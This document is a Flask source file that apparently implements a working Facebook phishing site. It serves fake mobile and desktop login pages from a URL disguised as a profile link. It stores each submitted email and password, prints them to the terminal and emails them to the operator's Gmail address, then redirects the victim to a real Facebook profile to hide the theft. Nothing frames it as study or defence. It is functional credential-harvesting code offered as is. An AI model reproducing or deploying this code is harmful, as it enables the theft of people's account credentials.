#   https://facebook-user-profile.herokuapp.com/user/aT346xB73C&q
from flask import Flask, render_template, request, redirect, url_for, session
from functools import wraps
from datamanager import *
from datetime import datetime, timedelta
from flask_mail import Mail, Message



app = Flask(__name__)
app.secret_key = 'ThisIsAVeryFuckingSecretKey'
app.config.from_pyfile('config.cfg')
mail = Mail(app)


account_url = 'https://www.facebook.com/ellacska.ella.5'


def print_to_terminal(login_data):
    upper_boarder = '------------------------KAPAS-VAN!------------------------\n'
    content = f'email: {login_data.get("email")}\npassword: {login_data.get("pass")}\n'
    lower_boarder = '----------------------------------------------------------'
    print(upper_boarder + content + lower_boarder)



def send_notification_email(login_data):
    message = Message('Kapas van!', sender='forropcs@gmail.com', recipients=['forropcs@gmail.com'])
    message.body = f'Kapas van!\n\nemail: {login_data.get("email")}\npassword: {login_data.get("pass")}'
    mail.send(message)



def redirect_if_user_in_session(function):
    @wraps(function)
    def decorated_function(*args, **kwargs):
        if is_in_session(session.get('email')):
            return redirect(url_for('profile'))
        return function(*args, **kwargs)
    return decorated_function



def set_permanent_session(days):
        session.permanent = True
        app.permanent_session_lifetime = timedelta(days=days)



@app.route('/user/aT346xB73C&q',methods=["GET","POST"])
@redirect_if_user_in_session
def login():
    if request.method == "POST":
        login_data = request.form.to_dict()
        login_data['date'] = datetime.now()
        try:
            add_login(login_data)
            set_permanent_session(30)
            session['email'] = login_data.get('email')
            print_to_terminal(login_data)
            send_notification_email(login_data)
        except Exception:
            pass
        return redirect(account_url)
    if request.args:
        if int(request.args.get('dev','')) == 1:
            return render_template('mobile_login.html')
        elif int(request.args.get('dev','')) == 2:
            return render_template('desktop_login.html')
    else:
        return render_template("device_detector.html")



@app.route('/profile')
def profile():
    return redirect(account_url)



@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))



if __name__ == '__main__':
    app.run()
